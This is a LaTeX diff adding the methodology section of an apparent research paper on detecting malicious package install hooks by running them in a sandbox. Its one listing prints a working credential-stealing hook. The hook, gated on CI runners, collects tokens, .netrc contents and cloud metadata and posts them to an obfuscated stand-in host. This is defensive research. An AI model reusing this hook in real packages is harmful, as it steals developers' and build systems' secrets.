@@ -1,0 +1,135 @@
+\section{Methodology}
+\label{sec:methodology}
+
+\subsection{Corpus}
+
+We subscribed to the publication feed of three registries, denoted
+Registry~A (a JavaScript ecosystem), Registry~B (Python), and Registry~C
+(Ruby), for 19 months. Names are withheld pending the completion of
+coordinated disclosure. Every new version was fetched within a median of 94
+seconds of publication, which matters because malicious versions are often
+withdrawn within hours and a slower crawler would miss them. We retained the
+archive, the manifest, and every declared hook.
+
+\subsection{What a hook looks like}
+
+Listing~\ref{lst:hook} is a redacted example from a package we assess as
+malicious, reformatted for width but otherwise unmodified. It illustrates why
+static analysis is not sufficient: the payload is assembled at runtime from a
+base64 fragment and the destination is built from string pieces, so no literal
+in the file names the collection host.
+
+\begin{lstlisting}[style=hook,caption={Redacted install hook from a package in
+Registry~A. The credential read is conditional on the host looking like a
+continuous integration runner, so an interactive install sees nothing
+unusual.},label={lst:hook}]
+#!/bin/sh
+# stated purpose: "rebuild native bindings"
+node-gyp rebuild 2>/dev/null || true
+
+if [ -z "$CI" ] && [ -z "$GITHUB_ACTIONS" ]; then
+  exit 0
+fi
+
+H=$(printf '%s' "cmV3YXJk" | base64 -d)
+D="${H}.$(printf '%s%s' "analytics" "-cdn.example")"
+
+P=$(env | grep -Ei 'token|secret|_key' | base64 -w0)
+Q=$(cat "$HOME/.netrc" 2>/dev/null | base64 -w0)
+R=$(curl -s -m 2 \
+  "http://169.254.169.254/latest/meta-data/iam/" || true)
+
+curl -s -m 5 -X POST "https://${D}/v2/collect" \
+  -H 'content-type: application/json' \
+  -d "{\"a\":\"${P}\",\"b\":\"${Q}\",\"c\":\"${R}\"}" \
+  >/dev/null 2>&1 || true
+
+exit 0
+\end{lstlisting}
+
+Three properties of Listing~\ref{lst:hook} recur across the malicious set. The
+hook performs its advertised function first, so the install succeeds and
+nothing looks wrong. It gates the payload on environment variables that
+indicate an unattended runner, which defeats manual inspection in an
+interactive shell. And it swallows every error, so a blocked connection
+produces no output.
+
+\subsection{The \tool{} sandbox}
+
+\tool{} executes each hook in a fresh user namespace with a private mount,
+network, and PID namespace. The filesystem is an overlay containing a realistic
+toolchain, a synthetic home directory seeded with honeypot credentials in the
+locations attackers actually read, and the unpacked package. The network
+namespace runs a responder that completes every TCP connection and answers
+every DNS query, so a hook that probes for reachability believes it succeeded
+and proceeds to send its payload, which is the behaviour we want to observe. We
+log syscalls with a seccomp user-notification filter rather than ptrace,
+because ptrace is detectable and two samples in our corpus checked for it.
+
+Each execution is capped at 180 seconds of wall clock and 2~GB of memory.
+Hooks that time out, 1.1 percent, are retried once with a 600-second cap and
+then recorded as inconclusive.
+
+\subsection{Classification}
+
+Algorithm~\ref{alg:classify} turns a syscall trace into a label. The design
+principle is that we never classify on the script text, only on what the
+process did, since text is trivially obfuscated and behaviour is not. The three
+signals are network contact outside the registry and package-mirror allowlist,
+reads of credential-bearing paths outside the package directory, and
+indications that the executed payload was not present in the archive, which we
+detect by comparing executed program images against the archive contents.
+
+\begin{algorithm}[t]
+  \caption{Behavioural classification of one hook execution}
+  \label{alg:classify}
+  \SetAlgoLined
+  \KwIn{syscall trace $T$, package archive $A$, registry allowlist $L$,
+        honeypot path set $C$}
+  \KwOut{label in \{benign, reckless, malicious, inconclusive\}}
+  \If{$T$ terminated by timeout or sandbox fault}{
+    \Return{inconclusive}\;
+  }
+  $\mathit{net} \gets \{h : \texttt{connect}(h) \in T,\; h \notin L\}$\;
+  $\mathit{cred} \gets \{p : \texttt{openat}(p) \in T,\; p \in C\}$\;
+  $\mathit{ext} \gets \{i : \texttt{execve}(i) \in T,\; i \notin A,\;
+    i \notin \text{toolchain}\}$\;
+  \eIf{$\mathit{net} \ne \emptyset$ \textbf{and}
+       ($\mathit{cred} \ne \emptyset$ \textbf{or} $\mathit{ext} \ne \emptyset$)}{
+    \Return{malicious}\;
+  }{
+    \eIf{$\mathit{net} \ne \emptyset$ \textbf{or} $\mathit{cred} \ne \emptyset$}{
+      \Return{reckless}\;
+    }{
+      \Return{benign}\;
+    }
+  }
+\end{algorithm}
+
+The reckless label is not a hedge. It covers hooks that download a binary from
+a vendor content delivery network over plain HTTP, or that read the user's
+global configuration to find a proxy, both of which are common, both of which
+have a defensible purpose, and both of which hand an attacker who controls that
+host the same execution the malicious set takes directly.
+
+\subsection{Validation}
+
+Two authors independently reviewed every execution labelled malicious or
+reckless, 2{,}622 in total, blind to the algorithm's label, and agreed with it
+on 96.4 percent of cases (Cohen's $\kappa = 0.91$). Disagreements were resolved
+by discussion, and the 47 packages we report as malicious are those where both
+reviewers and the classifier agreed. We also seeded 300 synthetic malicious
+hooks reproducing published incident behaviour; \tool{} labelled 291 of them
+malicious, and the nine misses all depended on an interactive prompt.
+
+\subsection{Ethics}
+
+We executed only code that was already published and that any user of these
+registries would have executed by installing the package. All execution was in
+an isolated network with no route to the internet apart from the recording
+responder, so no payload reached a real collection host. Honeypot credentials
+were synthetic and unusable. We disclosed every malicious finding to the
+relevant registry security team within 48 hours of confirmation, and this paper
+withholds package names and registry identities until those processes close.
+Our institutional review board reviewed the protocol and determined it was not
+human subjects research.
